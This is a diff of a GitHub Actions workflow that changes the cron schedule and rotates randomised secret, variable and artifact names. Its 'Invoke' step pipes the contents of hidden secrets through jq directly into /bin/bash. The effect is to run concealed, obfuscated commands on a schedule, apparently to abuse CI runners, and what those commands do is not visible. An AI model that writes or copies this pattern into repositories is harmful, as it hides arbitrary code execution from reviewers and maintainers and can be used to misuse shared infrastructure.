@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '49 3,9,15,21 * * *'
+    - cron: '22 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +18,18 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          zorvd94: ${{ secrets.zorvd94 }}
+          ijqv0: ${{ secrets.ijqv0 }}
         run: |
-          printf '%s' "$zorvd94" | jq -r .xtxl52269 | /bin/bash
-          printf '%s' "$wtdtu8488" | jq -r .g58 | /bin/bash
-          printf '%s' "$a444" | jq -r .irfix78500 | /bin/bash
-          printf '%s' "$wvexw6418" | jq -r .v7 | /bin/bash
+          printf '%s' "$ijqv0" | jq -r .mdl07 | /bin/bash
+          echo $kgjz736 | jq -r .yct29 | /bin/bash
+          printf '%s' "$f24710" | jq -r .rn439 | /bin/bash
+          printf '%s' "$zre54" | jq -r .qdz396 | /bin/bash
+          echo $u385 | jq -r .tgf0 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: yhTUX3xZ
+          name: KReuz6js
           path: "*.zip"
           retention-days: 1
